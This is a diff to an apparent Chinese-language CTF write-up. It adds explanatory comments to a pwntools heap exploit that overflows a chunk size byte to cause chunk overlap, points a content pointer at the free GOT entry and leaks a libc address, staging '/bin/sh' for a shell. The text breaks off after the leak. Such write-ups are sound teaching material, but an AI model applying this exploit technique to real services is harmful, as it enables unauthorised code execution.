@@ -167,6 +167,7 @@ int main(){
 - 申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。
 
 最终的exp如下
+
 ```
 #coding=utf-8
 from pwn import *
@@ -203,17 +204,17 @@ def delete(idx):
     sh.sendline(str(idx))
 
 free_got=elf.got['free']
-create(0x18,'aaaaaaa')  
-create(0x10,'aaaaaaa')
-create(0x10,'aaaaaaa')
-create(0x10,'/bin/sh\x00')
+create(0x18,'aaaaaaa')  		#idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节
+create(0x10,'aaaaaaa')			#idx1
+create(0x10,'aaaaaaa')			#idx2
+create(0x10,'/bin/sh\x00')		#idx3
 payload='a'*0x18+'\x81'
-edit(0,payload)  
-delete(1)
+edit(0,payload)  				#修改idx1的size为0x81 
+delete(1)						#idx1进入0x70的unsorted bin
 size='\x08'.ljust(8,'\x00')
 payload='b'*0x40+size+p64(free_got)
-create(0x70,payload)#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got
-show(2)#输出free真实地址,泄露libc基地址
+create(0x70,payload)	#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got
+show(2)	#输出free真实地址,泄露libc基地址
 sh.recvuntil('Content :')
 free_adr=u64(sh.recvline()[:-1].strip().ljust(8,'\x00'))
 #free_adr=u64(sh.recvuntil('\nDone')[:-5].ljust(8,'\x00'))
